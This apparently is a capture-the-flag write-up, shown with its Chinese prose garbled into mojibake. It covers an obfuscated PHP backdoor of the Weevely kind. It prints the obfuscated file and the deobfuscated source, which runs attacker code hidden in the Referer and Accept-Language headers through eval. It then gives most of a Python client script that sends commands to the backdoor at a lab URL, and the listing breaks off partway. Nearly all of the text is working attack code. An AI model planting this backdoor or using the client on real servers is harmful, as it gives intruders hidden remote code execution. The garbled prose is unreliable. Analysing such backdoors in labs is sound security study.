</span></span><span class="line"><span class="cl"><span class="nv">$o</span><span class="o">=</span><span class="s1">&#39;|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$N</span><span class="o">=</span><span class="s1">&#39;|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&#34;/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$C</span><span class="o">=</span><span class="s1">&#39;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&#34;|U&lt;$k&gt;$d&lt;/$k&gt;&#34;|U);@ses|U|Usion_des|Utroy();}}}}&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$j</span><span class="o">=</span><span class="s1">&#39;$k|Uh=&#34;|U|U42f7&#34;;$kf=&#34;e9ac&#34;;fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&#34;&#34;;fo|Ur($i=0;$i&lt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$R</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;rO&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;rOcreatrOe_rOrOfurOncrOtion&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$J</span><span class="o">=</span><span class="s1">&#39;kf|U),|U0,3));$p=&#34;|U&#34;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="s1">&#39;r)|U;pa|Urse|U_str($u[&#34;qu|U|Uery&#34;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&#34;/([\\|U|Uw])[|U\\w-]+|U(&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;|U&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$j</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nv">$z</span><span class="o">.</span><span class="nv">$x</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="nv">$M</span><span class="o">.</span><span class="nv">$J</span><span class="o">.</span><span class="nv">$q</span><span class="o">.</span><span class="nv">$N</span><span class="o">.</span><span class="nv">$U</span><span class="o">.</span><span class="nv">$C</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$g</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$g</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãËµ∑Êù•ÊòØËøõË°å‰∫ÜÊ∑∑Ê∑Ü</p>
<p>Êàë‰ª¨ÂÖàËøêË°åÁúãÁúãecho$fÁúãÁúãÂéüÊù•ÁöÑ‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$kh=&#34;42f7&#34;;$kf=&#34;e9ac&#34;;function x($t,$k){$c=strlen($k);$l=strlen($t);$o=&#34;&#34;;for($i=0;$i&lt;$l;){for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$r=$_SERVER;$rr=@$r[&#34;HTTP_REFERER&#34;];$ra=@$r[&#34;HTTP_ACCEPT_LANGUAGE&#34;];if($rr&amp;&amp;$ra){$u=parse_url($rr);parse_str($u[&#34;query&#34;],$q);$q=array_values($q);preg_match_all(&#34;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&#34;,$ra,$m);if($q&amp;&amp;$m){@session_start();$s=&amp;$_SESSION;$ss=&#34;substr&#34;;$sl=&#34;strtolower&#34;;$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p=&#34;&#34;;for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0){$s[$i]=&#34;&#34;;$p=$ss($p,3);}if(array_key_exists($i,$s)){$s[$i].=$p;$e=strpos($s[$i],$f);if($e){$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&#34;/_/&#34;,&#34;/-/&#34;),array(&#34;/&#34;,&#34;+&#34;),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print(&#34;&lt;$k&gt;$d&lt;/$k&gt;&#34;);@session_destroy();}}}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$kh=&#34;42f7&#34;;
</span></span><span class="line"><span class="cl">$kf=&#34;e9ac&#34;;
</span></span><span class="line"><span class="cl">function x($t,$k) {
</span></span><span class="line"><span class="cl">	$c=strlen($k);
</span></span><span class="line"><span class="cl">	$l=strlen($t);
</span></span><span class="line"><span class="cl">	$o=&#34;&#34;;
</span></span><span class="line"><span class="cl">	for ($i=0;$i&lt;$l;) {
</span></span><span class="line"><span class="cl">		for ($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) {
</span></span><span class="line"><span class="cl">			$o.=$t{$i}^$k{$j};
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	}
</span></span><span class="line"><span class="cl">	return $o;
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">$r=$_SERVER;
</span></span><span class="line"><span class="cl">$rr=@$r[&#34;HTTP_REFERER&#34;];
</span></span><span class="line"><span class="cl">$ra=@$r[&#34;HTTP_ACCEPT_LANGUAGE&#34;];
</span></span><span class="line"><span class="cl">if($rr&amp;&amp;$ra) {
</span></span><span class="line"><span class="cl">	$u=parse_url($rr);
</span></span><span class="line"><span class="cl">	parse_str($u[&#34;query&#34;],$q);
</span></span><span class="line"><span class="cl">	$q=array_values($q);
</span></span><span class="line"><span class="cl">	preg_match_all(&#34;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&#34;,$ra,$m);
</span></span><span class="line"><span class="cl">	if($q&amp;&amp;$m) {
</span></span><span class="line"><span class="cl">		@session_start();
</span></span><span class="line"><span class="cl">		$s=&amp;$_SESSION;
</span></span><span class="line"><span class="cl">		$ss=&#34;substr&#34;;
</span></span><span class="line"><span class="cl">		$sl=&#34;strtolower&#34;;
</span></span><span class="line"><span class="cl">		$i=$m[1][0].$m[1][1];
</span></span><span class="line"><span class="cl">		$h=$sl($ss(md5($i.$kh),0,3));
</span></span><span class="line"><span class="cl">		$f=$sl($ss(md5($i.$kf),0,3));
</span></span><span class="line"><span class="cl">		$p=&#34;&#34;;
</span></span><span class="line"><span class="cl">		for ($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];
</span></span><span class="line"><span class="cl">		if(strpos($p,$h)===0) {
</span></span><span class="line"><span class="cl">			$s[$i]=&#34;&#34;;
</span></span><span class="line"><span class="cl">			$p=$ss($p,3);
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">		if(array_key_exists($i,$s)) {
</span></span><span class="line"><span class="cl">			$s[$i].=$p;
</span></span><span class="line"><span class="cl">			$e=strpos($s[$i],$f);
</span></span><span class="line"><span class="cl">			if($e) {
</span></span><span class="line"><span class="cl">				$k=$kh.$kf;
</span></span><span class="line"><span class="cl">				ob_start();
</span></span><span class="line"><span class="cl">				@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&#34;/_/&#34;,&#34;/-/&#34;),array(&#34;/&#34;,&#34;+&#34;),$ss($s[$i],0,$e))),$k)));
</span></span><span class="line"><span class="cl">				$o=ob_get_contents();
</span></span><span class="line"><span class="cl">				ob_end_clean();
</span></span><span class="line"><span class="cl">				$d=base64_encode(x(gzcompress($o),$k));
</span></span><span class="line"><span class="cl">				print(&#34;&lt;$k&gt;$d&lt;/$k&gt;&#34;);
</span></span><span class="line"><span class="cl">				@session_destroy();
</span></span><span class="line"><span class="cl">			}
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	}
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•Áî®Â§ß‰Ω¨<a class="link" href="https://phuker.github.io/posts/weevely-backdoor-code-analysis.html"  target="_blank" rel="noopener"
    >WeevelyÔºö‰∏Ä‰∏™ PHP Ê∑∑Ê∑ÜÂêéÈó®ÁöÑ‰ª£Á†ÅÂàÜÊûê - Phuker&rsquo;s Blog</a>ÁöÑpoc,ÈúÄË¶Å‰øÆÊîπconfigÔºåÁî®python2ËøêË°å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># encoding: utf-8</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Ê≥®ÊÑè‰øÆÊîπ url , keyh , keyf Á≠âÂèÇÊï∞</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span><span class="p">,</span><span class="n">choice</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Áî®‰∫éÁîüÊàêÂÆåÊï¥ÁöÑ Accept-Language</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">choicePart</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">length</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s1">&#39;Error Input&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>    <span class="c1"># ÁªìÊûú</span>
</span></span><span class="line"><span class="cl">    <span class="n">indexes</span> <span class="o">=</span> <span class="p">[]</span>    <span class="c1"># Á¥¢Âºï</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">length</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indexes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">indexes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÁîüÊàêÈöèÊú∫Â°´ÂÖÖÂ≠óÁ¨¶‰∏≤( Áî±ÊâÄÊúâ ASCII Â≠óÁ¨¶ÁªÑÊàê , ÂåÖÊã¨‰∏çÂèØËØªÁöÑÂ≠óÁ¨¶ )</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">randBytesFlow</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÁîüÊàêÈöèÊú∫Â°´ÂÖÖÂ≠óÁ¨¶‰∏≤( Áî±ÊâÄÊúâÂ§ßÂ∞èÂÜôÂ≠óÊØçÁªÑÊàê )</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">randAlpha</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># choice() ÊñπÊ≥ïËøîÂõû‰∏Ä‰∏™ÂàóË°®ÔºåÂÖÉÁªÑÊàñÂ≠óÁ¨¶‰∏≤ÁöÑÈöèÊú∫È°π</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># string.ascii_letters ‰ºöÁîüÊàêÊâÄÊúâÁöÑÂ≠óÊØç</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ê®°Êãü x() ÂáΩÊï∞ , Âæ™ÁéØÂºÇÊàñÂä†ÂØÜ</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">loopXor</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">lenKey</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lenTxt</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">iTxt</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">iTxt</span> <span class="o">&lt;</span> <span class="n">lenTxt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">iKey</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">iTxt</span><span class="o">&lt;</span><span class="n">lenTxt</span> <span class="ow">and</span> <span class="n">iKey</span><span class="o">&lt;</span><span class="n">lenKey</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">iKey</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="n">iTxt</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">            <span class="n">iTxt</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">iKey</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÂºÄÂêØ Debug ÈÄâÈ°π</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debugPrint</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debugging</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">msg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÂÆö‰πâÂü∫Êú¨ÂèòÈáè</span>
</span></span><span class="line"><span class="cl"><span class="n">debugging</span> <span class="o">=</span> <span class="kc">False</span>    <span class="c1"># ÈªòËÆ§ÂÖ≥Èó≠ Debug , ÂèØÁî® True ÂºÄÂêØ</span>
</span></span><span class="line"><span class="cl"><span class="n">keyh</span> <span class="o">=</span> <span class="s2">&#34;42f7&#34;</span>    <span class="c1"># $kh , ÈúÄË¶Å‰øÆÊîπ</span>
</span></span><span class="line"><span class="cl"><span class="n">keyf</span> <span class="o">=</span> <span class="s2">&#34;e9ac&#34;</span>    <span class="c1"># $kf , ÈúÄË¶Å‰øÆÊîπ</span>
</span></span><span class="line"><span class="cl"><span class="n">xorKey</span> <span class="o">=</span> <span class="n">keyh</span> <span class="o">+</span> <span class="n">keyf</span>    <span class="c1"># $k</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://61.147.171.105:65362/hack.php&#39;</span>    <span class="c1"># ÊåáÂÆö URL  , ÈúÄË¶Å‰øÆÊîπ</span>
</span></span><span class="line"><span class="cl"><span class="n">defaultLang</span> <span class="o">=</span> <span class="s1">&#39;zh-CN&#39;</span>    <span class="c1">#ÈªòËÆ§Language</span>
</span></span><span class="line"><span class="cl"><span class="n">languages</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;zh-TW;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;zh-HK;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;en-US;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;en;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">]</span>    <span class="c1">#Accept-Language Ê®°Êùø</span>
</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="kc">None</span>    <span class="c1"># {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;} # ‰ª£ÁêÜ , ÂèØÁî®‰∫é BurpSuite Á≠â</span>
</span></span><span class="line"><span class="cl"><span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>    <span class="c1"># ÂàõÂª∫‰∏Ä‰∏™ SESSION ÂØπË±°</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÊØèÊ¨°‰ºöËØù‰ºö‰∫ßÁîü‰∏ÄÊ¨°ÈöèÊú∫ÁöÑ Accept-Language</span>
</span></span><span class="line"><span class="cl"><span class="n">langTmp</span> <span class="o">=</span> <span class="n">choicePart</span><span class="p">(</span><span class="n">languages</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>    <span class="c1"># ËæìÂá∫‰∏Ä‰∏™ÂàóË°® , ÂåÖÂê´Ê®°Êùø‰∏≠ÁöÑ‰∏âÁßç Accept-language</span>
</span></span><span class="line"><span class="cl"><span class="n">indexes</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">choicePart</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">),</span><span class="mi">3</span><span class="p">),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>    <span class="c1"># ÈôçÂ∫èÊéíÂ∫èËæìÂá∫‰∏â‰∏™ÊùÉÈáçÂÄº , ‰æãÂ¶Ç [8,6,4]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">acceptLang</span> <span class="o">=</span> <span class="p">[</span><span class="n">defaultLang</span><span class="p">]</span>   <span class="c1"># ÂÖàÊ∑ªÂä†ÈªòËÆ§Language</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">acceptLang</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">langTmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="p">(</span><span class="n">indexes</span><span class="p">[</span><span class="n">i</span><span class="p">],))</span>    <span class="c1"># ÁÑ∂ÂêéÂæ™ÁéØÊ∑ªÂä†‰∏âÁßç Accept-Language , Âπ∂‰∏∫ÂÖ∂Ê∑ªÂä†ÊùÉÈáçÂÄº</span>
</span></span><span class="line"><span class="cl"><span class="n">acceptLangStr</span> <span class="o">=</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">acceptLang</span><span class="p">)</span>    <span class="c1"># Â∞ÜÂ§ö‰∏™ Accept-Language Áî® &#34; , &#34; ÊãºÊé•Âú®‰∏ÄËµ∑</span>
</span></span><span class="line"><span class="cl"><span class="c1"># acceptLangStr Âç≥‰∏∫Ë¶Å‰ΩøÁî®ÁöÑ Accept-Language</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="n">acceptLangStr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">init2Char</span> <span class="o">=</span> <span class="n">acceptLang</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">acceptLang</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>    <span class="c1"># $i</span>
</span></span><span class="line"><span class="cl"><span class="n">md5head</span> <span class="o">=</span> <span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">init2Char</span> <span class="o">+</span> <span class="n">keyh</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())[</span><span class="mi">0</span><span class="p">:</span><span class="mi">3</span><span class="p">]</span>    <span class="c1"># $h</span>
